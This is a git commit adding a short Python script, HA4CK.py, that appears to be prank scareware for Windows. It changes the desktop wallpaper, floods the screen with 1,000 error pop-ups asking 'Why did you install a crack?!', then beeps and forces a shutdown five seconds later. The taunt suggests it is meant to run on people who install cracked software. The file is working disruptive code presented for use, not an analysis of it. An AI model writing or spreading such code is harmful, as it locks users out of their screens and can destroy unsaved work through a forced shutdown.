7d60c4edc4e60d6220d7cc6cccc12e9565715e95
rx550x <150556636+HOSAM-ALOMARI@users.noreply.github.com>
2024-12-28 20:10:46 +0300

    Add files via upload

---
+++ HA4CK.py
@@ -0,0 +1,33 @@
+import ctypes
+import os
+import tkinter as tk
+from tkinter import messagebox
+import winsound
+import subprocess
+
+def change_wallpaper(image_path):
+    if not os.path.exists(image_path):
+        show_message("Error", "The specified image path does not exist.")
+        return
+
+    try:
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+        for _ in range(1000): 
+            show_message("Warning", "Why did you install a crack?!")
+        print("#ctypes:1000")
+    except Exception as e:
+        show_message("Error", f"Failed to change wallpaper: {e}")
+        
+def shutdown_pc():
+    winsound.Beep(440, 1000)  
+    winsound.Beep(660, 1000)  
+    subprocess.run("shutdown /s /t 5", shell=True) 
+def show_message(title, message):
+    root = tk.Tk()
+    root.withdraw()  
+    messagebox.showerror(title, message) 
+
+image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg" 
+
+change_wallpaper(image_path)
+shutdown_pc()
